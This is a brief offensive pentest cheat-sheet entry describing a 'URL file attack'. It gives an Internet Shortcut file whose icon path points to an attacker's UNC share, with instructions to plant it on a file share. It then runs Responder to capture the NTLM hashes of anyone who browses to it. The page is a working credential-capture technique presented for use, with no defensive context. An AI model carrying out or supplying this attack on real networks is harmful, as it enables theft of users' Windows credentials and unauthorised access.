---
description: If u have a access to a share we can try this
---

# URL FILE ATTACK

```
[InternetShortcut]
URL=blah
WorkingDirectory=blah
IconFile=\\x.x.x.x\%USERNAME%.icon
IconIndex=1
```

Paste this into an .url file in the file share

then turn on listner for an event where someone opens it

```
responder -I eth0 -v
```

If the event occurs we get an access
